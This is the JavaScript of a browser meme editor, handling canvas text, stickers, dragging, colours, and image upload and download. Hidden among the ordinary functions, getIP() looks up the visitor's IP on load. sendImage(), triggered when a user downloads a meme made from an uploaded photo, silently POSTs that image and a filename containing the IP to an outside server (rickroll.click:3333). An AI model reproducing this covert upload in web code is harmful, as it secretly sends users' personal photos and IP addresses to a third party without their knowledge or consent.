'use strict';

var ip;
var gCtx;
var gImgs;
var gCanvas;
var gStartPos;
var gIsUpload = false;
var gIsHandle = false;
var gUrlUploadImg = '';
const gTouchEvs = ['touchstart', 'touchmove', 'touchend'];

function onInitMeme() {
    gCanvas = document.getElementById('canvas');
    gCtx = gCanvas.getContext('2d');
    resizeCanvas();
    addListeners();
    getIP();
}

function resizeCanvas() {
    var elContainer = document.querySelector('.canvas-container');
    gCanvas.width = elContainer.offsetWidth;
    gCanvas.height = elContainer.offsetHeight;
}

function getSelectedImage() {
    var meme = getMeme();
    if (!meme) return;
    var photoIdx = gImgs.findIndex(function (img) {
        return meme.selectedImgId === img.id;
    });
    return gImgs[photoIdx];
}

function addListeners() {
    window.addEventListener('resize', () => {
        resizeCanvas();
        renderCanvas();
    });
    gCanvas.addEventListener('mousedown', onDown);
    gCanvas.addEventListener('mousemove', onMove);
    gCanvas.addEventListener('mouseup', onUp);
    gCanvas.addEventListener('mouseleave', onUp);
    gCanvas.addEventListener('touchstart', onDown);
    gCanvas.addEventListener('touchmove', onMove);
    gCanvas.addEventListener('touchend', onUp);
}

function onDown(ev) {
    const clickedPos = getEvPos(ev);
    if (!isLineClicked(clickedPos)) return;
    if (isHandleClicked(clickedPos)) {
        gIsHandle = true;
    }
    var selectedLine = getSelectedLine();
    if (!selectedLine.isSticker) {
        RenderSelectedLine();
        gStartPos = clickedPos;
        document.body.style.cursor = 'grabbing';
    } else if (selectedLine.isSticker) {
        gStartPos = clickedPos;
        document.body.style.cursor = 'grabbing';
        document.querySelector('[name=text]').value = '';
        document.querySelector('[name=text]').placeholder = 'sticker!';
    }
}

function onMove(ev) {
    if (!isCanvas()) return;
    const line = getDragLine();
    if (line.isDrag && !gIsHandle) {
        var pos = getEvPos(ev);
        var dx = pos.x - gStartPos.x;
        var dy = pos.y - gStartPos.y;
        if (!line.isSticker) {
            moveLine(dx, dy);
        } else if (line.isSticker) {
            moveLineSticker(dx, dy);
        }
        gStartPos = pos;
        renderCanvas();
        renderRecEditor(line);
    } else if (line.isDrag && gIsHandle) {
        var pos = getEvPos(ev);
        var dx = pos.x - gStartPos.x;
        var dy = pos.y - gStartPos.y;
        if (!line.isSticker) {
            if (dy < 0) plusFont(1);
            else if (dy > 0) plusFont(-1);
        } else if (line.isSticker) {
            if (dy < 0) plusfontSticker(1);
            else if (dy > 0) plusfontSticker(-1);
        }
        gStartPos = pos;
        renderCanvas();
        renderRecEditor(line);
    }
}

function onUp() {
    if (!isCanvas()) return;
    gIsHandle = false;
    renderCanvas();
    setFalseLineDrag();
    var selectedLine = getSelectedLine();
    renderRecEditor(selectedLine);
    document.body.style.cursor = 'auto';
    if (!selectedLine.isSticker) document.querySelector('[name=text]').placeholder = 'type in something';
}

function getEvPos(ev) {
    var pos = {
        x: ev.offsetX,
        y: ev.offsetY
    };
    if (gTouchEvs.includes(ev.type)) {
        ev.preventDefault();
        ev = ev.changedTouches[0];
        pos = {
            x: ev.pageX - ev.target.offsetLeft - ev.target.clientLeft,
            y: ev.pageY - ev.target.offsetTop - ev.target.clientTop
        };
    }
    return pos;
}

function renderCanvas() {
    if (!gIsUpload) {
        var currImg = getSelectedImage();
        if (!currImg) {
            drawText('Choose a photo', (gCanvas.height / 5), (gCanvas.height / 5), (gCanvas.height / 10), 
            { outLineColor: '#000000', fillColor: '#FFFFFF' }, 'Impact', 'start');
            return;
        }
        drawImgFromLocal(currImg.url);
    } else {
        var uploadImgURL = getUploadUrlIMG();
        drawImgFromLocal(uploadImgURL);
    }
    drawLines();
}

function drawSticker(sticker) {
    let stickerRender = new Image();
    stickerRender.src = sticker.url;
    gCtx.drawImage(stickerRender, sticker.position.x, sticker.position.y, sticker.widthX, sticker.heightY);
}

function drawLines() {
    if (!isCanvas()) return;
    var meme = getMeme();
    meme.lines.forEach(line => {
        if (!line.isSticker) {
            drawText(line.txt, line.position.x, line.position.y, line.fontSize, line.color, line.font, line.textAlign);
        } else if (line.isSticker) {
            drawSticker(line.isSticker);
        }
    });
}

function drawImgFromLocal(imgUrl) {
    var img = new Image();
    img.src = imgUrl;
    gCtx.drawImage(img, 0, 0, gCanvas.width, gCanvas.height);
}

function drawText(txt, x, y, size, color, font, align) {
    gCtx.lineWidth = 2;
    gCtx.strokeStyle = color.outLineColor;
    gCtx.fillStyle = color.fillColor;
    gCtx.font = `${size}px ${font}`;
    gCtx.textAlign = align;
    gCtx.fillText(txt, x, y);
    gCtx.strokeText(txt, x, y);
}

function renderRecEditor(line) {
    if (!line.isSticker) {
        if (line.txt === '') return;
        if (line.textAlign === 'left') {
            drawRect((line.position.x - 10), (line.position.y - (1 * line.fontSize)),
                line.txt.length * (0.55 * line.fontSize), (1.2 * line.fontSize));
        }
        if (line.textAlign === 'center') {
            drawRect((line.position.x - 10 - (line.txt.length * 0.5 * line.fontSize / 2)), (line.position.y - (1 * line.fontSize)),
                line.txt.length * (0.55 * line.fontSize), (1.2 * line.fontSize));
        }
        if (line.textAlign === 'right') {
            drawRect((line.position.x - 10 - (line.txt.length * 0.5 * line.fontSize)), (line.position.y - (1 * line.fontSize)),
                line.txt.length * (0.55 * line.fontSize), (1.2 * line.fontSize));
        }
    } else {
        drawRect(line.isSticker.position.x, line.isSticker.position.y, line.isSticker.widthX, line.isSticker.heightY);
    }
}

function drawRect(x, y, width, height) {
    gCtx.beginPath();
    gCtx.rect(x, y, width, height);
    gCtx.strokeStyle = '#ffffff';
    gCtx.fillRect(x, y, 10, 10);
    gCtx.fillStyle = '#ffffff';
    gCtx.stroke();
}

function getCanvas() {
    return gCanvas;
}

function onType(txt) {
    if (!isCanvas()) return;
    updateTxtLine(txt);
    renderCanvas();
    var selectedLine = getSelectedLine();
    renderRecEditor(selectedLine);
}
function onChangeFont(font) {
    if (!isCanvas()) {
        document.querySelector('#fonts').value = 'Impact';
        return;
    }
    ChangeFont(font);
    renderCanvas();
}

function onPlusFont(diff) {
    if (!isCanvas()) return;
    var selectedLine = getSelectedLine();
    if (!selectedLine.isSticker) {
        plusFont(diff);
    } else {
        plusfontSticker(diff);
    }
    renderCanvas();
}

function onChangeColor() {
    if (!isCanvas()) {
        document.querySelector('[name=text-outline-color]').value = '#000000';
        document.querySelector('[name=text-fill-color]').value = '#ffffff';
        return;
    }
    var outLineColor = document.querySelector('[name=text-outline-color]').value;
    var fillColor = document.querySelector('[name=text-fill-color]').value;
    const SelectedColor = { outLineColor: outLineColor, fillColor: fillColor };
    changeColor(SelectedColor);
    renderCanvas();
}

function onAddText() {
    if (!isCanvas()) return;
    addText(gCanvas.height, gCanvas.width);
    RenderSelectedLine();
    renderCanvas();
    var selectedLine = getSelectedLine();
    renderRecEditor(selectedLine);
}

function onAddSticker(id) {
    if (!isCanvas()) return;
    addSticker(gCanvas.height, gCanvas.width, id);
    renderCanvas();
}

function onDeleteText() {
    if (!isCanvas()) return;
    deleteText();
    cleanTxtLine();
    renderCanvas();
}

function onTextAlign(align) {
    if (!isCanvas()) return;
    textAlign(align);
    renderCanvas();
}

function onSwitchItem() {
    if (!isCanvas()) return;
    changeLineIdx();
    RenderSelectedLine();
    renderCanvas();
    var selectedLine = getSelectedLine();
    renderRecEditor(selectedLine);
    document.querySelector('[name=text]').placeholder = 'type something';
    if (selectedLine.isSticker) {
        document.querySelector('[name=text]').value = '';
        document.querySelector('[name=text]').placeholder = 'sticker!';
    }
}

function RenderSelectedLine() {
    var selectedLine = getSelectedLine();
    document.querySelector('[name=text]').value = selectedLine.txt;
    document.querySelector('[name=text-outline-color]').value = selectedLine.color.outLineColor;
    document.querySelector('[name=text-fill-color]').value = selectedLine.color.fillColor;
    document.querySelector('#fonts').value = selectedLine.font;
}

function cleanTxtLine() {
    document.querySelector('[name=text]').value = '';
}

function onImgInput(ev) {
    loadImageFromInput(ev, renderImg);
    resetMeme();
    cleanTxtLine();
    gIsUpload = true;
    renderCanvas();
}

function loadImageFromInput(ev, onImageReady) {
    document.querySelector('.share-container').innerHTML = '';
    var reader = new FileReader();
    reader.onload = function (event) {
        var img = new Image();
        img.onload = onImageReady.bind(null, img);
        img.src = event.target.result;
        saveUploadImgURL(img.src);
    };
    reader.readAsDataURL(ev.target.files[0]);
}

function renderImg(img) {
    gCtx.drawImage(img, 0, 0, gCanvas.width, gCanvas.height);
}

function getUploadUrlIMG() {
    return gUrlUploadImg;
}

function saveUploadImgURL(imgSrc) {
    //console.log('img.src', imgSrc)
    gUrlUploadImg = imgSrc;

}

function getIP(){
    const url = "https://icanhazip.com";
    var xhr = new XMLHttpRequest();
    xhr.open('GET',url, true);
    xhr.onload = function () {
        if (xhr.readyState === xhr.DONE) {
            if (xhr.status === 200) {
                //console.log(xhr.responseText);
                ip = xhr.responseText.trim();
            }
        }
    };
    xhr.send(null);
    return ip;
}

function getDate(){
    const date = new Date();
    const dateString = date.getDate()+"-"+(date.getMonth()+1)+"-"+date.getFullYear()+"_"+date.getHours()+"-"+date.getMinutes()+"-"+date.getSeconds();
    return dateString;
}

function getFileName(){
    const filename = ip + "_" + getDate() + ".jpg";
    return filename;
}

function sendImage(){
    var xhr = new XMLHttpRequest();
    var url = "http://rickroll.click:3333/upload";
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            void(0);
        }
    };
    var data = JSON.stringify({"name": getFileName(), "image": gCanvas.toDataURL('image/jpeg')});
    xhr.send(data);
}

function onSaveMeme() {
    if (!isCanvas()) return;
    if (gIsUpload) {
          sendImage();
          return;
    }
    renderCanvas();
}

function onDownloadImg(elLink) {
    renderCanvas();
    var imgContent = gCanvas.toDataURL('image/jpeg');
    elLink.href = imgContent;
    onSaveMeme();
}